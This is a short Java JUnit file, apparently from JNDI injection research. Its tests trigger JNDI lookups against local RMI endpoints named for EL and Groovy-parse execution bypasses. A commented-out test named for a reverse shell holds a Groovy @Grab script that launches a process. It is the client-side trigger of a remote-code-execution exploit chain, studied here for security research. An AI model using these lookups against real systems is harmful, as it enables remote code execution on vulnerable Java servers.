import groovy.lang.GroovyShell;
import org.junit.Test;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.script.ScriptEngine;


public class Target {

    @Test
    public void lookupBypassByEL()throws NamingException{
        InitialContext ctx = new InitialContext();
        ctx.lookup("rmi://127.0.0.1:1097/ExecByEL");
    }

    @Test
    public void lookupBypassByGroovyParse()throws NamingException{
        InitialContext ctx = new InitialContext();
        ctx.lookup("rmi://127.0.0.1:1097/ExecByGroovyParse");
    }


    @Test
    public void testRevershell() throws Exception {
//        String script = "import org.buildobjects.process.ProcBuilder\n" +
//                "@Grab('org.buildobjects:jproc:2.2.3')\n" +
//                "class Dummy{ }\n" +
//                "print new ProcBuilder(\"gedit\").run().getOutputString()\n";
//        GroovyShell groovyShell = new GroovyShell();
//        groovyShell.parse(script);
    }

}
